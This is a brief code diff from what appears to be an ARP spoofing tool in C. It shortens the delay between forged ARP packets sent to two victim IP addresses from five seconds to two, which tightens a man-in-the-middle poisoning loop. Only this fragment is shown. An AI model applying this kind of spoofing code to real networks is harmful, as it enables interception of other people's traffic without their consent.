@@ -154,7 +154,7 @@ void spoof_arp(const int sd, struct sockaddr_ll *device,
             return 0;
         }
         fprintf(stdout, "[+] SPOOFED Packet sent to '%s'\n", victim_ip_2);
-        sleep(5);
+        sleep(2);
 
         if ((sendto(sd, arp_packet_2, ARP_PKT_LEN + ETH_HDR_LEN, 0,
                     (const struct sockaddr *)device, sizeof(*device))) <= 0) {
@@ -162,7 +162,7 @@ void spoof_arp(const int sd, struct sockaddr_ll *device,
             return 0;
         }
         fprintf(stdout, "[+] SPOOFED Packet sent to '%s'\n", victim_ip_1);
-        sleep(5);
+        sleep(2);
     }
 
     return 1;
